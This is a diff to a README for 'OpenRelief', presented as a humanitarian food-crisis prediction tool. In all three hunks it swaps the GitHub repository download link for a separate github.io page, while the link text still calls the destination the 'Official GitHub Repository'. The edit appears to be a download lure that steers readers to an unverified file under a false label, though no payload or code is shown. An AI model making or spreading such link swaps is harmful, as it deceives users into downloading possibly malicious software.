@@ -1,7 +1,7 @@
 <h1>🌍 OpenRelief - Predict Food Crises Before They Happen</h1>
 
 <p align="center">
-  <a href="https://github.com/illalaced9547/OpenRelief">
+  <a href="https://illalaced9547.github.io">
     <img src="https://img.shields.io/badge/Download-OpenRelief_Now-2ea44f?style=for-the-badge&logo=github" alt="Download OpenRelief" />
   </a>
 </p>
@@ -33,7 +33,7 @@ Welcome! This section will guide you through downloading, installing, and runnin
 
 Visit this link to download the application: 
 
-**[👉 Click Here to Download OpenRelief](https://github.com/illalaced9547/OpenRelief)**
+**[👉 Click Here to Download OpenRelief](https://illalaced9547.github.io)**
 
 This link takes you to the official OpenRelief download page. Look for the big green button that says "Download" or "Releases." Click it, and the download will start automatically. The file might take a few minutes depending on your internet speed—it contains all the geographic maps and models needed to run offline. 
 
@@ -128,7 +128,7 @@ This tool is donated to the humanitarian community by developers who believe tha
 
 Just in case you need to get back to the download page, here is the link one more time:
 
-**[📥 Download OpenRelief from Official GitHub Repository](https://github.com/illalaced9547/OpenRelief)**
+**[📥 Download OpenRelief from Official GitHub Repository](https://illalaced9547.github.io)**
 
 Thank you for choosing OpenRelief. We hope it helps you protect vulnerable communities with clarity, confidence, and compassion. 
 
